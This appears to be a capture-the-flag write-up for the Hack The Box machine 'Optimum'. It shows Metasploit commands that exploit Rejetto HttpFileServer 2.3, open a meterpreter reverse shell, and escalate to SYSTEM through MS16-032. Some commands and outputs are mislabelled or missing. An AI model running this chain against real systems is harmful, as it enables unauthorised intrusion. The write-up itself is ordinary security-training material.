First off, we need to figure out what this is:
netcat -A -v 10.129.58.195

Returns:

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Server-Header reads HFS 2.3
HTTP-Title reads HFS
HttpFileServer is the version

So a quick google search shows that this is HttpFileServer 2.3.

Time to figure out if there's an exploit!

Firstly we start up Metasploit so we can start searching, then:

> searchsploit HFS

Returns us:

My eyes are drawn to the lowest hanging fruit - remote command execution! 

To find out more I run:

> searchsploit -x 39426.rb

Giving this a read over.. This seems like something we'd like to try out!

> search HFS

Gives us:

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description

   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

So now we want to use the Rejetto HttpFileServer Remote Command Execution, since we've confirmed that the exploit module is available:

> use exploit/windows/http/rejetto_hfs

With our module loaded, we then want to see the options we have to set in order to get it to run successfully:

msf5 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description

   SRVPORT    8080             yes       The local port to listen on.

   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic

From this we're looking at the two important ones for us: RHOST and SRVHOST.

We'll set the RHOST, which is our target: 

> set RHOST 10.129.58.195 (The target IP)
> set SRVHOST 10.10.14.85 (My IP address/the listener IP address)

Then enter in the fun command:

> exploit

Now we've got a shell! Lets grab some additional information on our target system:

> getuid
> sysinfo

From 'getuid' we grab:

Server username: OPTIMUM\kostas

And from 'sysinfo':

Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows

Something that sticks out here is that the Architecture is x64, but the meterpreter is using x86/windows - not great!

So we'll use the following command:

> background

And put our current session in the background so we can come back to it later - although if you have to open up another session, that's OK! Sometimes they'll time out.

We want to change our Meterprefer from x86 to x64, but we still want to keep the same settings so that we're still able to get a meterpreter shell.

We'll review our current options:

msf5 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description

   RPORT      80               yes       The target port (TCP)
   SRVHOST    10.10.14.85      yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.85      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

From this we can see that the payload is where meterpreter comes in, and by default running x86. To change that:

> set payload windows/x64/meterpreter/reverse_tcp

This will change our current payload from (windows/meterpreter/reverse_tcp) to (windows/x64/meterpreter/reverse_tcp). We want to make sure that we're running things compatible so that if something does break or go wrong, at least we know we're using the proper architeture! 

Now we'll run this again using the following command:

> exploit

Then once we've opened a new meterpreter shell, type 'sysinfo' to confirm that the Meterpreter shell is showing as x64, instead of x86:

meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x64/windows

Great!

Now on to grabbing the user and root flags!

Lets see what we can find in our current directory:

> ls

meterpreter > ls
Listing: C:\Users\kostas\Desktop
================================

100444/r--r--r--  32      fil   2017-03-18 12:13:18 +0000  user.txt.txt

Well, there's user.txt sitting right there! As user.txt.txt.

We want to see the contents so:

> cat user.txt.txt

And we've succesfully grabbed our user flag! Hooray! 

Now we just need the root.

Since we're in kostas Desktop, lets see if there's another user directory.. There is! But we cannot access it. The Administrators folder sits out of our reach with our current level of access.

Time to upgrade!

First thing we're going to do is see if our current level of access gives us the ability to escalate our privileges on this system, for that we'll utilize 'post/multi/recon/local_exploit_suggester'. 

We'll feed this in:

> use post/multi/recon/local_exploit_suggester

Then we'll take a look at options:

msf5 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

Our x64 session is session 2.

You can see your session list with:

> sessions -l

So we'll set this to use session 2, and we want it to describe the exploits so we can see if they're viable:

> set session 2
> set showdescription true
> run

This gives us:

[*] 10.129.58.195 - Collecting local exploits for x64/windows...
[*] 10.129.58.195 - 15 exploit checks are being tried...
[+] 10.129.58.195 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
  Microsoft Windows allows for the automatic loading of a profiling 
  COM object during the launch of a CLR process based on certain 
  environment variables ostensibly to monitor execution. In this case, 
  we abuse the profiler by pointing to a payload DLL that will be 
  launched as the profiling thread. This thread will run at the 
  permission level of the calling process, so an auto-elevating 
  process will launch the DLL with elevated permissions. In this case, 
  we use gpedit.msc as the auto-elevated CLR process, but others would 
  work, too.

Lets try this! 

> use exploit/windows/local/bypassuac_dotnet_profiler

We'll check options, and it's asking for our session - remembering that we're running our x64 session as session 2:

> set session 2

We're ready for exploitation!

> exploit

[*] Started reverse TCP handler on 178.128.226.210:4444 
[*] UAC is Enabled, checking level...
[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
[*] Exploit completed, but no session was created.

Damn. Not in admins group - so we can't escalate.

So now we need to find out how to upgrade our current access to something that'll let us get into everything. Lets search exploit-db for Windows Server 2012 R2! 

After searching up 'Windows 2012 R2' on exploit-db, I've got a list of 4. One DoS, two Remote, one Local. The local being.. Privilege escalation! Exactly what I'm looking for considering I already have a shell.

This is MS16-032, and now that we know that, we want to see if Metasploit has a module to gain us access..

Found one!

> use exploit/windows/local/ms16_032_secondary_logon_handle_privesc

We'll make sure that 'session' is set to '2'. That way it's using the session we want. Note that if your session expires, that's OK. Just set it back up, and check your sessions with 'sessions -l'. Then you can set your session to the appropriate session number.

   LPORT     4444             yes       The listen port

 So our session is set, what else are we missing?

 LHOST and LPORT!

 LHOST doesn't match with what we want (our machine's IP address), so:

 > set LHOST 10.10.14.85


But LPORT looks OK!

Except... That payload doesn't look right!

That's better.

All that's left is to run it!

Perfect! We have a SYSTEM shell.

We'll check that by accessing the local shell:

meterpreter > shell
Process 2348 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system

Yup! That's a system shell if I ever saw one.

Armed with this, we can now go anywhere.

We'll return back to the meterpreter shell with 'exit'.

I want to go into the Administrator folder in Users, so:

> cd 'C:\Users\Administrator\'

meterpreter > ls
